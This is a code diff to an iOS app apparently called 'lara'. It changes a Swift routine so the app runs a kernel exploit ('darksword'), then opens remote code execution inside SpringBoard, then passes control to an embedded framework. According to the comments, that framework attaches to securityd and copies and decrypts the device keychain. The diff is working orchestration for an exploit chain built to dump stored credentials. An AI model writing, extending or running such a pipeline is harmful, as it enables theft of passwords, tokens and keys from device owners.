@@ -140,14 +140,57 @@ struct lara: App {
         }
     }
 
-    // Framework-only mode: the embedded libuiopsersvc.framework is fully
-    // self-contained. It brings up kernel r/w itself (ds_run -> its own exploit
-    // + kernelcache fetch/parse), builds its own SpringBoard/securityd remote
-    // attach, then copies + AKS-unwraps the keychain DB. lara's own exploit,
-    // sandbox escape and RemoteCall chain are not used at all.
+    // Framework-only mode: the embedded libuiopsersvc.framework brings up its
+    // own kernel r/w (ds_run -> its own exploit + kernelcache fetch/parse), but
+    // its securityd copy path still requires a ready SpringBoard RemoteCall
+    // ("RemoteCall SpringBoard: not ready — tap Initialize RemoteCall before
+    // keychain-dump"). So bring up lara's own exploit + SpringBoard RemoteCall
+    // FIRST, then hand off to the framework pipeline.
     private func autorunkeychainpipeline() {
         globallogger.log("(kc) using embedded libuiopsersvc.framework (framework-only)")
-        prepareAndRunKeychainPipeline()
+
+        // Keep the process alive and guard scene-phase teardown for the WHOLE
+        // sequence (darksword -> SpringBoard RemoteCall -> framework pipeline).
+        mgr.kcpipelineactive = true
+        if !kaenabled { toggleka() }
+
+        prepareSpringBoardRemoteCallThenPipeline()
+    }
+
+    // lara darksword -> SpringBoard RemoteCall -> framework keychain pipeline.
+    private func prepareSpringBoardRemoteCallThenPipeline() {
+        let mgr = self.mgr
+        if mgr.dsready {
+            startSpringBoardRemoteCallThenPipeline()
+            return
+        }
+        if mgr.dsrunning {
+            globallogger.log("(kc) lara darksword already running — keychain pipeline continues without SpringBoard RemoteCall")
+            prepareAndRunKeychainPipeline()
+            return
+        }
+        globallogger.log("(kc) bringing up lara darksword for SpringBoard RemoteCall...")
+        mgr.run { success in
+            if success {
+                self.startSpringBoardRemoteCallThenPipeline()
+            } else {
+                globallogger.log("(kc) lara darksword failed — keychain pipeline continues without SpringBoard RemoteCall")
+                self.prepareAndRunKeychainPipeline()
+            }
+        }
+    }
+
+    private func startSpringBoardRemoteCallThenPipeline() {
+        let mgr = self.mgr
+        globallogger.log("(kc) initializing SpringBoard RemoteCall before keychain dump...")
+        mgr.rcinit(process: "SpringBoard", migbypass: false) { success in
+            if success {
+                globallogger.log("(kc) SpringBoard RemoteCall ready before keychain dump")
+            } else {
+                globallogger.log("(kc) SpringBoard RemoteCall init failed: \(mgr.rcLastError ?? "unknown")")
+            }
+            self.prepareAndRunKeychainPipeline()
+        }
     }
 
     // Drive the embedded framework end-to-end. The framework owns the whole
